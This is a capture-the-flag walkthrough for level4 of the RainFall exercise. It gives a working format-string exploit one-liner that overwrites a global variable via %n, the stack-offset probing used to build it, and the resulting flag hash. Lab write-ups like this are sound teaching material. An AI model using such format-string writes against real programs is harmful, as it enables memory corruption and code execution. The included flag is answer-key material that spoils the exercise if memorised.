# Walkthrough

## Solution

```
(python -c 'print ("\x10\x98\x04\x08" + "%16930112c" + "%12$n")') | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
## Explanation

### Execution

```
level4@RainFall:~$ ./level4
hello
hello
```
-> The program waits for an input, and then echo that output.  

### Disassembly

```
info variable
0x08049810  m

info function
0x08048444  p
0x08048457  n
0x080484a7  main
```

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  


### Steps

There is a call to printf, when calling p() in n().  
It compares the variable n to 16930116, we can use the %n exploit like in level3.  

Let's find in which position does the m variable address starts.
```
level4@RainFall:~$ ./level4 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```  
-> it is on the 12th position

However, we can't write 16930116 characters, but we can play with the width parameter of printf.

-------------------------------  
m address: 0x08049810  
printing 16930112 characters (16930116 - 4 bytes (m address))  

> (python -c 'print ("\x10\x98\x04\x08" + "%16930112c" + "%12$n")') | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a